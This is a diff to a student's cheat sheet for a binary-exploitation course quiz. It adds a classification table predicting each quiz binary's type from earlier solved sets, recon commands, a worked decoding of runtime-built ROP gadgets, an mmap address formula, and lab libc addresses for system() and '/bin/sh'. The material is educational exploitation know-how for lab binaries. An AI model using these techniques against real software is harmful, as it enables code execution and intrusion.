@@ -8,19 +8,30 @@
 ## ⚠️ NEXT QUIZ — WHAT TO EXPECT (ROP focused)
 
 > **This quiz will focus on Return-Oriented Programming (ROP) and mmap-based gadget chains.**
-> The previous quiz (Quiz 3) covered shellcode + ret2libc. This one goes further.
+> The previous quiz (Quiz 3) covered shellcode + ret2libc + control-flow redirect. This one escalates.
 
-**Expected binary patterns:**
-- NX on (`GNU_STACK RW`) — shellcode won't work → **ROP or ret2libc**
-- `main()` may call `mmap()` + write gadgets via `movb` → **pre-built ROP gadgets at fixed address**
-- Gadget tables will differ between bin.1/bin.2/bin.3 — **decode fresh for each binary**
-- `.bss` may be poisoned by `init_data()` → **use mmap_base+0x500 as writable address**
+**Based on all solved sets — realistic expectations:**
 
-**Start here for this quiz:**
-1. `readelf -l ./bin.X | grep GNU_STACK` → RW = ROP/ret2libc, RWE = shellcode
-2. `objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"` → detect mmap gadgets
-3. `python3 ~/326_quiz3/tools/find_gadgets.py ./bin.X` → auto-find gadgets
-4. See **Section 6 (ROP)** for full step-by-step workflow
+| Binary | Most likely | Reasoning |
+|--------|-------------|-----------|
+| bin.0 | PIE warm-up — skip | Consistent this year (lefteris/nektarios/kyriaki/2026-g3) |
+| bin.1 | NX on → **mmap ROP** or ret2libc | ROP not tested this year yet |
+| bin.2 | RWE → **shellcode** | bin.2 was shellcode in EVERY solved set, both years |
+| bin.3 | NX on → **mmap ROP** (different gadget table from bin.1) | Pattern from 1048972 and out4 set B |
+
+**Still possible — do not assume:**
+- All bins could be ret2libc/shellcode (happened in last year's regina/tasos sets)
+- Offsets will differ from all previous sets — always read `lea -0xNN(%ebp)` fresh per binary
+
+**Start here — 4 commands that classify any binary:**
+```bash
+readelf -l ./bin.X | grep GNU_STACK         # RW=NX on, RWE=shellcode
+readelf -h ./bin.X | grep Type              # ET_DYN=PIE (skip), ET_EXEC=fixed
+objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
+objdump -d ./bin.X | grep "int.*0x80"       # ROP needs this
+```
+
+Then: RWE → shellcode · RW+no mmap → ret2libc · RW+mmap+movb → mmap ROP (Section 6 STEP 2)
 
 ---
 
@@ -273,28 +284,90 @@ objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|mov
 ```
 
 **If you see `mmap` + `movb`:** the binary builds its own gadgets at runtime.
-Do NOT hunt for gadgets in the binary code — they don't exist there yet.
-Instead, decode the `movb` bytes:
+Do NOT hunt for gadgets in the binary code — they do not exist there yet.
 
+#### How to extract movb bytes (concrete example)
+
+Run:
 ```bash
 objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
-# Each movb writes one byte into a heap buffer
-# Read bytes in order (+0, +1, +2...) → decode as x86 instructions
-# Common patterns: 58=pop eax, 5b=pop ebx, c3=ret, 31c0=xor eax,eax, etc.
 ```
 
-**mmap base formula:**
+Output looks like this:
+```
+ 8049123:  c6 45 e8 58    movb   $0x58,-0x18(%ebp)
+ 8049127:  c6 45 e9 5b    movb   $0x5b,-0x17(%ebp)
+ 804912b:  c6 45 ea c3    movb   $0xc3,-0x16(%ebp)
+ 804912f:  c6 45 eb 31    movb   $0x31,-0x15(%ebp)
+ 8049133:  c6 45 ec c0    movb   $0xc0,-0x14(%ebp)
+ 8049137:  c6 45 ed c3    movb   $0xc3,-0x13(%ebp)
+ ...
+```
+
+Read the **last hex value on each line** (the `$0xNN` value) in order:
+```
+byte +0x00 = 0x58
+byte +0x01 = 0x5b
+byte +0x02 = 0xc3  → gadget 0: 58 5b c3 = pop eax; pop ebx; ret
+byte +0x03 = 0x31
+byte +0x04 = 0xc0
+byte +0x05 = 0xc3  → gadget 1: 31 c0 c3 = xor eax,eax; ret
+...
+```
+Every 3 bytes = one gadget (2-byte instruction + `0xc3` ret).
+Look up each 3-byte group in the gadget reference table below.
+
+#### Find the hardcoded address for mmap_base
+
+In the objdump of main(), look for the `call mmap` or `mmap@plt` call and the address pushed before it:
+```bash
+objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
+# Look for a push or mov with a hex address near the mmap call
+# That address is the hardcoded_addr
+```
+
+#### mmap_base formula
 ```python
-mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize
-# pagesize = 0x1000 (4096)
-# gadget_base = mmap_base + TEMP_value  (TEMP=1000 → offset=1000=0x3e8)
+# pagesize = 0x1000
+hardcoded_addr = 0x8048980   # from objdump — the address pushed before mmap call
+mmap_base      = (hardcoded_addr // 0x1000 - 0x1000) * 0x1000
+# Example: 0x8048980 // 0x1000 = 0x8048 → 0x8048 - 0x1000 = 0x7048 → * 0x1000 = 0x07048000
+
+gadget_base    = mmap_base + 1000   # TEMP=1000, offset IS the TEMP value directly
+# Example: 0x07048000 + 0x3e8 = 0x070483e8
+
+# Each gadget address:
+gadget_at_offset = gadget_base + byte_offset   # +0x00, +0x03, +0x06, +0x09...
 ```
 
-**Writable memory for mmap ROP:**
+#### Chain re-sequencing (different gadget order across binaries)
+
+Each binary in the same quiz set may have gadgets in a **different byte order**.
+The chain LOGIC is always the same — only the addresses change.
+
+Example — same 8 gadgets, different offsets across two binaries:
 ```
-⚠️  NEVER use .bss when binary has mmap — init_data() may fill it with 0xffffffff
-    Always use mmap_base + 0x500 (zeroed by MAP_ANONYMOUS, safe null terminator)
+bin.3:  +0x00=xor eax  +0x03=pop eax/ebx  +0x06=mov[ebx],eax  +0x09=xor ecx  ...
+bin.4:  +0x00=pop eax/ebx  +0x03=xor eax  +0x06=mov[ebx],eax  +0x09=mov ebx,eax  ...
 ```
+
+After decoding the movb table for YOUR binary, map each gadget to its offset:
+```python
+gb = gadget_base
+G_POP_EAX_POP_EBX = gb + 0x??   # whatever offset your binary has
+G_MOV_EBXPTR_EAX  = gb + 0x??
+# etc — fill in from YOUR decoded table, not from any example
+```
+Then use `solve_rop_template.py` which takes these variables — the chain structure never changes.
+
+#### init_data() and .bss null terminator problem
+
+Some binaries call `init_data()` before `main()` which fills `.bss` with `0xffffffff`.
+Your "/bin//sh" string needs a null byte (`0x00`) at offset +8 to terminate correctly.
+If `.bss + 8` contains `0xffffffff`, execve gets "/bin//sh\xff\xff\xff\xff" → returns ENOENT silently.
+
+**Rule: always use `mmap_base + 0x500` as writable — never `.bss` when mmap is present.**
+The mmap region is zeroed by `MAP_ANONYMOUS` — guaranteed null terminator.
 
 ---
 
@@ -601,6 +674,14 @@ python3 -c "import struct; print(struct.pack('<I',0xbfffe2e4))"
 ## 10. OUT4 QUIZ — SOLVED EXPLOITS
 
 > **Structure is NOT fixed across quiz sets.** The same binary names (bin.1–bin.4) can have completely different internals between quiz iterations. Always re-run recon from scratch. See both solution sets below.
+
+> ⛔ **SECTIONS 10A–10F USE STALE WSL2 LIBC ADDRESSES — DO NOT COPY THEM**
+> Last year's sets used WSL2 Ubuntu libc. This year's lab machine uses Rocky Linux libc.
+> | Symbol | ❌ Old WSL2 (DO NOT USE) | ✅ Lab machine (use these) |
+> |--------|--------------------------|---------------------------|
+> | `system()` | `0xb7dd58e0` | `0xb7dffd30` |
+> | `"/bin/sh"` | `0xb7f42de8` | `0xb7f40caa` |
+> Always get fresh addresses from GDB on the lab machine: `p system` + `find &system,+99999999,"/bin/sh"`
 
 ---
 
